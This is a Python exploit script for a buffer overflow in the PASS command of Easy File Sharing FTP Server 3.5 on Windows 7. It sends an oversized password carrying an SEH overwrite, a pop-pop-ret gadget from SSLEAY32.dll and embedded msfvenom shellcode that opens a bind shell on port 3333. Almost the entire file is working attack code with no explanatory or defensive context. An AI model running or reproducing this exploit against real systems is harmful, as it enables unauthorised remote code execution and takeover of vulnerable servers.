#!/usr/bin/python 
# Easy File Sharing FTP Server 3.5 on Windows 7 x86 SP1 
import socket
import sys 

host = '192.168.1.114'
port = 21

# msfvenom -p windows/shell_bind_tcp -e x86/alpha_mixed -b "\x00\xcc" LPORT=3333 -f python EXITFUNC=seh (718 bytes)
buf =  ""
buf += "\x89\xe1\xdb\xc7\xd9\x71\xf4\x5a\x4a\x4a\x4a\x4a\x4a"
buf += "\x4a\x4a\x4a\x4a\x4a\x4a\x43\x43\x43\x43\x43\x43\x37"
buf += "\x52\x59\x6a\x41\x58\x50\x30\x41\x30\x41\x6b\x41\x41"
buf += "\x51\x32\x41\x42\x32\x42\x42\x30\x42\x42\x41\x42\x58"
buf += "\x50\x38\x41\x42\x75\x4a\x49\x6b\x4c\x7a\x48\x6f\x72"
buf += "\x73\x30\x37\x70\x45\x50\x65\x30\x6e\x69\x6a\x45\x50"
buf += "\x31\x6b\x70\x55\x34\x4c\x4b\x66\x30\x64\x70\x4e\x6b"
buf += "\x62\x72\x44\x4c\x6e\x6b\x46\x32\x64\x54\x4c\x4b\x51" 
buf += "\x62\x65\x78\x64\x4f\x38\x37\x53\x7a\x71\x36\x64\x71"
buf += "\x79\x6f\x6c\x6c\x47\x4c\x33\x51\x33\x4c\x57\x72\x36"
buf += "\x4c\x67\x50\x5a\x61\x7a\x6f\x54\x4d\x45\x51\x4a\x67"
buf += "\x39\x72\x4b\x42\x61\x42\x66\x37\x4e\x6b\x46\x32\x66"
buf += "\x70\x6c\x4b\x72\x6a\x67\x4c\x6e\x6b\x32\x6c\x34\x51"
buf += "\x74\x38\x6b\x53\x71\x58\x75\x51\x58\x51\x70\x51\x4e"
buf += "\x6b\x76\x39\x45\x70\x35\x51\x78\x53\x6c\x4b\x43\x79"
buf += "\x47\x68\x6a\x43\x45\x6a\x62\x69\x6e\x6b\x50\x34\x6c"
buf += "\x4b\x56\x61\x78\x56\x36\x51\x4b\x4f\x6e\x4c\x6b\x71"
buf += "\x4a\x6f\x54\x4d\x36\x61\x6f\x37\x65\x68\x4b\x50\x42"
buf += "\x55\x49\x66\x67\x73\x63\x4d\x69\x68\x77\x4b\x71\x6d"
buf += "\x45\x74\x53\x45\x6b\x54\x73\x68\x6c\x4b\x52\x78\x56"
buf += "\x44\x65\x51\x5a\x73\x70\x66\x4c\x4b\x54\x4c\x30\x4b"
buf += "\x4e\x6b\x62\x78\x65\x4c\x65\x51\x79\x43\x4c\x4b\x55"
buf += "\x54\x6c\x4b\x66\x61\x5a\x70\x4b\x39\x33\x74\x56\x44"
buf += "\x51\x34\x63\x6b\x33\x6b\x55\x31\x76\x39\x30\x5a\x66"
buf += "\x31\x4b\x4f\x6d\x30\x63\x6f\x71\x4f\x51\x4a\x6c\x4b"
buf += "\x44\x52\x68\x6b\x6e\x6d\x53\x6d\x63\x58\x57\x43\x50"
buf += "\x32\x45\x50\x55\x50\x35\x38\x73\x47\x33\x43\x76\x52"
buf += "\x63\x6f\x63\x64\x42\x48\x32\x6c\x72\x57\x76\x46\x76"
buf += "\x67\x6b\x4f\x4e\x35\x4c\x78\x6c\x50\x56\x61\x75\x50"
buf += "\x77\x70\x34\x69\x6b\x74\x73\x64\x66\x30\x30\x68\x45"
buf += "\x79\x4f\x70\x62\x4b\x43\x30\x6b\x4f\x6a\x75\x52\x4a"
buf += "\x67\x78\x76\x39\x36\x30\x4b\x52\x4b\x4d\x53\x70\x46"
buf += "\x30\x57\x30\x36\x30\x75\x38\x6a\x4a\x36\x6f\x59\x4f"
buf += "\x79\x70\x6b\x4f\x38\x55\x5a\x37\x45\x38\x33\x32\x57"
buf += "\x70\x74\x4d\x44\x45\x6b\x39\x79\x76\x71\x7a\x46\x70"
buf += "\x50\x56\x63\x67\x53\x58\x6f\x32\x6b\x6b\x36\x57\x52"
buf += "\x47\x59\x6f\x79\x45\x51\x47\x30\x68\x6d\x67\x68\x69"
buf += "\x47\x48\x39\x6f\x49\x6f\x5a\x75\x30\x57\x35\x38\x61"
buf += "\x64\x38\x6c\x77\x4b\x58\x61\x79\x6f\x5a\x75\x76\x37"
buf += "\x6a\x37\x65\x38\x54\x35\x72\x4e\x30\x4d\x65\x31\x6b"
buf += "\x4f\x4b\x65\x72\x48\x52\x43\x52\x4d\x70\x64\x65\x50"
buf += "\x4b\x39\x6d\x33\x42\x77\x42\x77\x70\x57\x76\x51\x4b"
buf += "\x46\x70\x6a\x36\x72\x70\x59\x70\x56\x78\x62\x4b\x4d"
buf += "\x53\x56\x78\x47\x71\x54\x65\x74\x35\x6c\x76\x61\x73"
buf += "\x31\x4e\x6d\x71\x54\x61\x34\x64\x50\x38\x46\x45\x50"
buf += "\x63\x74\x72\x74\x42\x70\x62\x76\x76\x36\x56\x36\x72"
buf += "\x66\x73\x66\x70\x4e\x72\x76\x70\x56\x52\x73\x36\x36"
buf += "\x35\x38\x63\x49\x78\x4c\x35\x6f\x4c\x46\x69\x6f\x78"
buf += "\x55\x4c\x49\x49\x70\x42\x6e\x43\x66\x42\x66\x59\x6f"
buf += "\x44\x70\x33\x58\x35\x58\x6f\x77\x47\x6d\x53\x50\x39"
buf += "\x6f\x5a\x75\x6d\x6b\x69\x6e\x74\x4e\x70\x32\x4b\x5a"
buf += "\x32\x48\x6c\x66\x6e\x75\x6d\x6d\x4d\x4d\x49\x6f\x69"
buf += "\x45\x77\x4c\x64\x46\x63\x4c\x74\x4a\x6d\x50\x49\x6b"
buf += "\x79\x70\x44\x35\x64\x45\x4f\x4b\x73\x77\x77\x63\x74"
buf += "\x32\x52\x4f\x72\x4a\x77\x70\x30\x53\x79\x6f\x4e\x35"
buf += "\x41\x41"

try: 
    s = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
except:
    print("Socket() Failed")
    sys.exit(1) 

s.connect((host,port))
print(s.recv(1024))
s.send("USER anonymous\r\n")
print(s.recv(1024))
payload = "PASS "
payload += "," 
payload += "A"* 2559
payload += "\xeb\x0c\x90\x90" # Short JMP 
payload +=  "\x94\x8c\x01\x10"  #0x10018c94 : pop ebp # pop ecx # ret  |  {PAGE_EXECUTE_READ} [SSLEAY32.dll] ASLR: False, Rebase: False, SafeSEH: False, OS: False, v-1.0- (C:\EFS Software\Easy File Sharing FTP Server\SSLEAY32.dll)
payload += "\x90" * 20 
payload += buf # Payload 
payload += "C" * (4085 - 2559 - 4 - 4 - 20 - 718) 
payload += "\r\n" 

s.send(payload)
print(s.recv(1024))
s.close() 